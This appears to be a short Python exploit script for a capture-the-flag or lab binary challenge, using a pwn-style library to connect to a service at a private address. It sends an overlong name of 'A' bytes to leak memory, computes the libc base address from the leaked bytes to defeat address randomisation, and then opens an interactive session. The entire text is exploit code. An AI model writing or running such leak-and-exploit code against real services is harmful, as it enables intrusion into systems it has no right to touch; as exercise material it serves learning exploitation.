from PwnIOI import *

s = IOI(['192.168.0.85',1234])
raw_input()
s.read_until('name :')
s.write('A'*0x19)
libc = u32(s.read_until(',')[0x1e:0x1e+4]) - 0x1b2041
log(" libc : 0x%x"%libc)
s.interact()
